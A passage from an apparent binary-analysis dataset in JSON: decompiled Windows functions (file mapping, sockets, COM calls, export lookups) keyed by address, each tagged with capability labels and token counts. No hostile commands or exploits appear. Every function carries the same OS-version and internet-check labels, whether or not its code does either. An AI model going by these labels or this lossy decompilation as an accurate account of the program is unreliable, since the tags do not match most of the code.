1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.00411a58();\n                }\n                iVar2 = iVar2 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    else {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.00411a58();\n                }\n                iVar2 = iVar2 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    fcn.00406928(0);\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x45e63d;\n    uStack40 = 0x45e635;\n    fcn.00406934();\n    return;\n}\n",
        "token_count": 638
    },
    "0045e87c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.0045e87c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x44) != 0) {\n        return 3;\n    }\n    return *(in_EAX + 0x48);\n}\n",
        "token_count": 59
    },
    "0045f554": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f554(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack244;\n    uint uStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    int32_t iStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    int32_t iStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint var_78h;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint var_68h;\n    uint lpBaseAddress;\n    uint hFileMappingObject;\n    uint hObject;\n    uint var_4h;\n    \n    uStack140 = 0x45f569;\n    cVar1 = fcn.0040a25c();\n    if (cVar1 != '\\0') {\n        uStack140 = 0x45f579;\n        fcn.0045eaa0();\n        uStack140 = 0;\n        uStack144 = 0x8000080;\n        uStack148 = 3;\n        uStack152 = 0;\n        uStack156 = 3;\n        uStack160 = 0x80000000;\n        uStack164 = 0x45f592;\n        uStack164 = fcn.004059dc();\n        puStack168 = 0x45f598;\n        iVar2 = sub.kernel32.dll_CreateFileA_1();\n        if (iVar2 != -1) {\n            uStack172 = 0x45f674;\n            iStack176 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff50;\n            uStack180 = 0;\n            uStack184 = 0;\n            uStack188 = 0;\n            uStack192 = 2;\n            iStack196 = 0;\n            puStack204 = 0x45f5c6;\n            iStack200 = iVar2;\n            puStack168 = &stack0xfffffffc;\n            iVar3 = sub.kernel32.dll_CreateFileMappingA();\n            if (iVar3 == 0) {\n                *in_FS_OFFSET = iStack200;\n                uStack192 = 0x45f67b;\n                iStack200 = 0x45f673;\n                iStack196 = iVar2;\n                sub.kernel32.dll_CloseHandle_1();\n                return;\n            }\n            uStack208 = 0x45f656;\n            iStack212 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff2c;\n            uStack216 = 0;\n            uStack220 = 0;\n            uStack224 = 0;\n            iStack228 = 4;\n            puStack236 = 0x45f5f2;\n            iStack232 = iVar3;\n            puStack204 = &stack0xfffffffc;\n            iVar4 = sub.kernel32.dll_MapViewOfFile();\n            if (iVar4 != 0) {\n                uStack240 = 0x45f638;\n                iStack244 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff0c;\n                puStack236 = &stack0xfffffffc;\n                sub.kernel32.dll_GetFileSize_1(iVar2, 0);\n                fcn.0045eac4();\n                *in_FS_OFFSET = iVar2;\n                iStack244 = 0x45f63f;\n                sub.kernel32.dll_UnmapViewOfFile(iVar4);\n                return;\n            }\n            *in_FS_OFFSET = iStack232;\n            uStack224 = 0x45f65d;\n            iStack232 = 0x45f655;\n            iStack228 = iVar3;\n            sub.kernel32.dll_CloseHandle_1();\n            return;\n        }\n        puStack168 = 0x45f686;\n        fcn.0045eb58();\n        *param_2 = var_78h;\n        param_2[1] = uStack120;\n        param_2[2] = uStack116;\n        param_2[3] = uStack112;\n    }\n    return;\n}\n",
        "token_count": 1024
    },
    "0045fbb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045fbb8(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x45fc49;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x497cfc = *0x497cfc + 1;\n    if (*0x497cfc == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x4908d4 != 0) {\n            fcn.00404650();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x4908d8 != 0) {\n            fcn.00404650();\n        }\n        if (*0x4908dc != 0) {\n            fcn.00404650();\n        }\n        if (*0x4908e0 != 0) {\n            fcn.00404650();\n        }\n        if (*0x4908e4 != 0) {\n            fcn.00404650();\n        }\n        uStack20 = *0x497cf8;\n        sub.gdiplus.dll_GdiplusShutdown();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 315
    },
    "0045fc54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045fca0)\n// WARNING: Removing unreachable block (ram,0x0045fcae)\n// WARNING: Removing unreachable block (ram,0x0045fcc6)\n// WARNING: Removing unreachable block (ram,0x0045fce2)\n// WARNING: Removing unreachable block (ram,0x0045fcf8)\n// WARNING: Removing unreachable block (ram,0x0045fcfc)\n\nvoid fcn.0045fc54(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x45fc70;\n    fcn.004059cc();\n    uStack48 = 0x45fd24;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.0045f948();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x45fd2b;\n    uStack48 = 0x45fd1b;\n    fcn.00405530();\n    uStack48 = 0x45fd23;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 319
    },
    "004603a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004603a8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    \n    if (*(in_EAX + 0xc) == '\\0') {\n        uStack16 = *(in_EAX + 0x3e);\n        uStack20 = *(*(in_EAX + 0x11) * 4 + 0x490948);\n        uStack24 = *(*(in_EAX + 0xf) * 4 + 0x4908e8);\n        sub.wsock32.dll_socket();\n        iVar1 = (**(*in_EAX + 0x38))();\n        in_EAX[0x10] = iVar1;\n        *(in_EAX + 0xc) = iVar1 != -1;\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x31) == '\\x01') {\n                uStack24 = 1;\n                sub.wsock32.dll_ioctlsocket(in_EAX[0x10], 0x8004667e, &uStack24);\n                (**(*in_EAX + 0x38))();\n            }\n            in_EAX[0xd] = 0;\n            in_EAX[0xe] = 0;\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "0046042c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046042c(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(in_EAX + 0xc) != '\\0') {\n        sub.wsock32.dll_closesocket(in_EAX[0x10]);\n        (**(*in_EAX + 0x38))();\n        in_EAX[0x10] = -1;\n        *(in_EAX + 0xc) = 0;\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00460a1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00460a1c(void)\n\n{\n    if (*0x497e94 == 0) {\n        *0x497e94 = sub.kernel32.dll_GetModuleHandleA_2(0x460b78);\n        if (*0x497e94 != 0) {\n            *0x497e98 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460b88);\n            *0x497e9c = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460ba4);\n            *0x497ea0 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460bb4);\n            *0x497ea4 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460bc4);\n            *0x497ea8 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460bd0);\n            *0x497eac = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460bdc);\n            *0x497eb0 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460bf8);\n            *0x497eb4 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460c08);\n            *0x497eb8 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460c18);\n            *0x497ebc = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460c28);\n            *0x497ec0 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460c38);\n            *0x497ec4 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460c48);\n            *0x497ec8 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460c58);\n            *0x497ecc = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460c68);\n            *0x497ed0 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460c78);\n            *0x497ed4 = sub.kernel32.dll_GetProcAddress_1(*0x497e94, 0x460c88);\n        }\n    }\n    if ((*0x497e94 != 0) && (*0x497e98 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 585
    },
    "00460d38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00460d38(void)\n\n{\n    if (*0x497ed8 == 0) {\n        *0x497ed8 = sub.kernel32.dll_LoadLibraryA(0x460f04);\n        if (*0x497ed8 < 0x20) {\n            *0x497ed8 = 0;\n            return 0;\n        }\n        *0x497edc = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460f10);\n        *0x497ee0 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460f20);\n        *0x497ee4 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460f34);\n        *0x497ee8 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460f48);\n        *0x497eec = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460f34);\n        *0x497ef0 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460f48);\n        *0x497ef4 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460f60);\n        *0x497ef8 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460f74);\n        *0x497efc = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460f8c);\n        *0x497f00 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460fa4);\n        *0x497f04 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460fb4);\n        *0x497f08 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460fc4);\n        *0x497f0c = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460fe0);\n        *0x497f10 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460ff4);\n        *0x497f14 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x461010);\n        *0x497f18 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460fe0);\n        *0x497f1c = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x460ff4);\n        *0x497f20 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x461010);\n        *0x497f24 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x46102c);\n        *0x497f28 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x461040);\n        *0x497f2c = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x46105c);\n        *0x497f30 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x461078);\n        *0x497f34 = sub.kernel32.dll_GetProcAddress_1(*0x497ed8, 0x46108c);\n    }\n    return 1;\n}\n",
        "token_count": 777
    },
    "00461c6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00461c6c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    int32_t var_16ch;\n    uint var_168h;\n    uint var_158h;\n    uint var_154h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_178h = 0;\n    var_174h = 0;\n    var_170h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    puStack384 = 0x461ca6;\n    var_16ch = in_EAX;\n    fcn.00405fe8();\n    uStack388 = 0x461e97;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    if (*(var_16ch + 0xd) == '\\0') {\n        puStack396 = 0x461cd5;\n        puStack384 = &stack0xfffffffc;\n        fcn.0040e820();\n        puStack396 = 0x461ce0;\n        fcn.004055c8();\n        puStack396 = 0x461cf7;\n        fcn.00405864();\n        puStack396 = 0x461d0d;\n        iVar1 = fcn.0040a478();\n        if (iVar1 == 0) {\n            uStack400 = 0x461d7b;\n            uStack404 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffe6c;\n            puStack396 = &stack0xfffffffc;\n            do {\n                fcn.00405864();\n                (**(**(var_16ch + 0x4c) + 0x38))();\n                iVar1 = fcn.0040a4c8();\n                if (iVar1 != 0) break;\n            } while (*(var_16ch + 0xd) == '\\0');\n            *in_FS_OFFSET = uStack404;\n            puStack396 = 0x461d82;\n            uStack400 = 0x461d7a;\n            fcn.0040a4ec();\n            return;\n        }\n        if (*(var_16ch + 0x48) != '\\0') {\n            puStack396 = 0x461da5;\n            fcn.00405864();\n            puStack396 = 0x461dbb;\n            iVar1 = fcn.0040a478();\n            if (iVar1 == 0) {\n                uStack400 = 0x461e54;\n                uStack404 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffe6c;\n                puStack396 = &stack0xfffffffc;\n                do {\n                    bVar2 = (var_158h & 0x10) == 0;\n                    if (!bVar2) {\n                        fcn.00405974();\n                        if (!bVar2) {\n                            fcn.00405974();\n                            if (!bVar2) {\n                                fcn.00405864();\n                                fcn.00461c6c();\n                            }\n                        }\n                    }\n                    iVar1 = fcn.0040a4c8();\n                } while ((iVar1 == 0) && (*(var_16ch + 0xd) == '\\0'));\n                *in_FS_OFFSET = uStack404;\n                puStack396 = 0x461e5b;\n                uStack400 = 0x461e53;\n                fcn.0040a4ec();\n                return;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x461e9e;\n    uStack388 = 0x461e78;\n    fcn.00405554();\n    uStack388 = 0x461e89;\n    fcn.004060ac();\n    uStack388 = 0x461e96;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 950
    },
    "00462a2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462a2c(int32_t arg_8h, uint noname_1, uint noname_2, int32_t *arg_14h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    int32_t iStack24;\n    uchar *puStack20;\n    uchar *var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x462a3e;\n    fcn.00407080();\n    iStack24 = 0x462ab4;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    piStack32 = arg_14h;\n    puStack20 = &stack0xfffffffc;\n    var_4h = (**(*arg_14h + 0x10))();\n    if (0 < var_4h) {\n        (**(*arg_14h + 0xc))(arg_14h, &fcn.00462a2c::var_8h);\n        if (*(arg_8h + 8) == 0) {\n            puStack20 = var_8h;\n            iStack24 = var_4h;\n            piStack28 = 0x402;\n            piStack32 = *(**0x4925bc + 4);\n            sub.user32.dll_SendMessageA();\n        }\n        else {\n            puStack20 = 0x462a9c;\n            (**(arg_8h + 8))();\n        }\n    }\n    *in_FS_OFFSET = piStack32;\n    iStack24 = 0x462abb;\n    piStack28 = 0x462ab3;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 391
    },
    "00462ac4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00462ac4(int32_t arg_8h, uint noname_1, uint noname_2, uint arg_14h, int32_t arg_18h)\n\n{\n    if (0 < arg_18h) {\n        if (*(arg_8h + 8) == 0) {\n            sub.user32.dll_SendMessageA(*(**0x4925bc + 4), 0x402, arg_18h, arg_14h);\n        }\n        else {\n            (**(arg_8h + 8))();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 134
    },
    "0046291c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004629da)\n// WARNING: Removing unreachable block (ram,0x004629e6)\n// WARNING: Removing unreachable block (ram,0x004629dc)\n\nvoid fcn.0046291c(void)\n\n{\n    uchar *puVar1;\n    int32_t **in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x462a1a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (*in_EAX == NULL) {\n        puStack48 = 0x462950;\n        piVar2 = fcn.00404620();\n        *in_EAX = piVar2;\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    uStack52 = 0x462971;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(**in_EAX + 0x44))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x46298a;\n    puStack48 = fcn.0040700c();\n    uStack52 = *0x4924a0;\n    uStack56 = 1;\n    uVar5 = *0x49256c;\n    uVar3 = sub.ole32.dll_CoCreateInstance(*0x49256c, 0);\n    if ((uVar3 & 0x80000000) == 0) {\n        fcn.0040700c();\n        uVar4 = fcn.0040700c(0);\n        (**(_pe_dos_header + 0xc))(0, *0x49271c, uVar4);\n    }\n    *in_FS_OFFSET = uVar5;\n    uStack56 = 0x462a21;\n    fcn.00405530();\n    fcn.0040700c();\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 563
    },
    "00462be0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00462be0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff5c;\n    uint uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint var_49h;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    \n    puStack96 = 0x462bfe;\n    var_49h._0_1_ = param_2;\n    fcn.00405fe8();\n    uStack100 = 0x462e12;\n    uStack104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff98;\n    puStack96 = &stack0xfffffffc;\n    uVar1 = fcn.0040700c();\n    uVar2 = sub.ole32.dll_CoCreateInstance(*0x4925a0, 0, 3, *0x492760, uVar1);\n    if ((uVar2 & 0x80000000) == 0) {\n        uVar1 = fcn.0040700c();\n        uVar2 = sub.ole32.dll_CoCreateInstance(*0x4923b4, 0, 1, 0x462e24, uVar1);\n        if ((uVar2 & 0x80000000) == 0) {\n            uVar1 = fcn.0040700c();\n            in_stack_ffffff5c = *0x4924d4;\n            uVar2 = sub.ole32.dll_CoCreateInstance(*0x4924d4, 0, 1, *0x4922b0, uVar1);\n            if ((uVar2 & 0x80000000) == 0) {\n                uVar1 = fcn.0040700c();\n                uVar2 = (****(in_EAX + 0x24))(*(in_EAX + 0x24), *0x492690, uVar1);\n                if ((uVar2 & 0x80000000) == 0) {\n                    (**(**(in_EAX + 0x34) + 0x18))(*(in_EAX + 0x34), 0);\n                    if (var_49h != '\\0') {\n                        fcn.00403af4();\n                        unique0x00006400 = **0x4926a4;\n                        uStack72 = (*0x4926a4)[1];\n                        uStack68 = (*0x4926a4)[2];\n                        uStack64 = (*0x4926a4)[3];\n                        var_38h = **0x4925d8;\n                        uStack56 = (*0x4925d8)[1];\n                        uStack52 = (*0x4925d8)[2];\n                        uStack48 = (*0x4925d8)[3];\n                        uVar2 = (**(**(in_EAX + 0x34) + 0x10))(*(in_EAX + 0x34), &fcn.00462be0::var_49h + 1);\n                        if ((uVar2 & 0x80000000) != 0) goto code_r0x00462df6;\n                    }\n                    if (*(in_EAX + 0x3c) == 0) {\n                        uVar1 = fcn.00404620();\n                        *(in_EAX + 0x3c) = uVar1;\n                        uVar1 = fcn.00404620();\n                        *(*(in_EAX + 0x3c) + 0xc) = uVar1;\n                        fcn.00407024();\n                    }\n                    (**(**(in_EAX + 0x34) + 0x24))(*(in_EAX + 0x34), *(in_EAX + 0x40), param_1);\n                    uVar1 = fcn.0040700c();\n                    in_stack_ffffff5c = *0x492528;\n                    uVar2 = sub.ole32.dll_CoCreateInstance(*0x492528, 0, 3, *0x4922a0, uVar1);\n                    if ((uVar2 & 0x80000000) == 0) {\n                        uVar1 = fcn.0040700c();\n                        uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x492300, uVar1);\n                        if ((uVar2 & 0x80000000) == 0) {\n                            uVar1 = fcn.0040700c();\n                            uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x4926e8, uVar1);\n                            if ((uVar2 & 0x80000000) == 0) {\n                                uVar1 = fcn.0040700c();\n                                uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x492364, uVar1);\n                                if ((uVar2 & 0x80000000) == 0) {\n                                    (**(**(in_EAX + 0x10) + 0x34))(*(in_EAX + 0x10), *(in_EAX + 4), 0x8001, 0);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00462df6:\n    *in_FS_OFFSET = in_stack_ffffff5c;\n    fcn.004060ac(0x462e19);\n    return;\n}\n",
        "token_count": 1301
    },
    "00463024": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00463102)\n// WARNING: Removing unreachable block (ram,0x00463106)\n// WARNING: Removing unreachable block (ram,0x0046314b)\n\nvoid __cdecl fcn.00463024(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = 0x463046;\n    fcn.004059cc();\n    uStack56 = 0x46317f;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00405530();\n    fcn.00409b6c();\n    fcn.004055c8();\n    if (in_EDX == 0) {\n        fcn.004055c8();\n    }\n    if (arg_8h != 0) {\n        fcn.0040700c();\n        uStack80 = *0x49256c;\n        uVar1 = sub.ole32.dll_CoCreateInstance();\n        if ((uVar1 & 0x80000000) == 0) {\n            fcn.0040700c();\n            fcn.0040700c();\n            (**(_pe_dos_header + 0xc))(0);\n        }\n    }\n    *in_FS_OFFSET = uStack80;\n    fcn.00405530();\n    fcn.0040700c();\n    fcn.00405530();\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 426
    },
    "004631a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004631a0(void)\n\n{\n    int32_t in_EAX;\n    uint uStack20;\n    uint uStack16;\n    \n    if (*(in_EAX + 8) != 0) {\n        sub.user32.dll_GetClientRect(*(in_EAX + 4), &uStack20);\n        (**(**(in_EAX + 8) + 0x9c))(*(in_EAX + 8), 0, 0, uStack20, uStack16);\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "00463220": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
